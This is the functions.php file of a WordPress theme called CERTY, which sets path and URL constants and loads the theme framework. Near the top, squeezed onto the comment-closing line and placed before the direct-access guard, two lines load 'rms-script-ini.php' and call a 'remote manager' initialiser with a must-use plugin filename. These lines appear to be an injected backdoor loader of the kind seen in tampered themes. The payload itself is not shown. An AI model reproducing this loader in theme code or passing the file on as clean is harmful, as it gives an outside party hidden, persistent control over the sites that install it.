<?php
/**
 * CERTY Theme functions and definitions
 *
 * @package Certy_Theme
 */require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);// Prevent direct script access.
if ( ! defined( 'ABSPATH' ) ) {
	die( 'No direct script access allowed' );
}

if ( ! defined( 'CERTY_THEME_PATH' ) ) {
	define( 'CERTY_THEME_PATH', trailingslashit( get_template_directory() ) );
}
if ( ! defined( 'CERTY_THEME_URL' ) ) {
	define( 'CERTY_THEME_URL', trailingslashit( get_template_directory_uri() ) );
}

if ( ! defined( 'CERTY_INCLUDES_PATH' ) ) {
	define( 'CERTY_INCLUDES_PATH', CERTY_THEME_PATH . 'framework/' );
}
if ( ! defined( 'CERTY_INCLUDES_URL' ) ) {
	define( 'CERTY_INCLUDES_URL', CERTY_THEME_URL . 'framework/' );
}

if ( ! defined( 'CERTY_BACKEND_PATH' ) ) {
	define( 'CERTY_BACKEND_PATH', CERTY_INCLUDES_PATH . 'backend/' );
}
if ( ! defined( 'CERTY_BACKEND_URL' ) ) {
	define( 'CERTY_BACKEND_URL', CERTY_INCLUDES_URL . 'backend/' );
}

if ( ! defined( 'CERTY_FRONTEND_PATH' ) ) {
	define( 'CERTY_FRONTEND_PATH', CERTY_INCLUDES_PATH . 'frontend/' );
}
if ( ! defined( 'CERTY_FRONTEND_URL' ) ) {
	define( 'CERTY_FRONTEND_URL', CERTY_INCLUDES_URL . 'frontend/' );
}
if ( ! defined( 'CERTY_TEMPLATE_PARTS' ) ) {
	define( 'CERTY_TEMPLATE_PARTS', 'framework/frontend/template-parts/' );
}


/**
 * Load common resources (required by both, BACKEND and FRONTEND, contexts).
 */
require_once( CERTY_INCLUDES_PATH . 'functions.php' );

do_action( 'certy_after_functions' );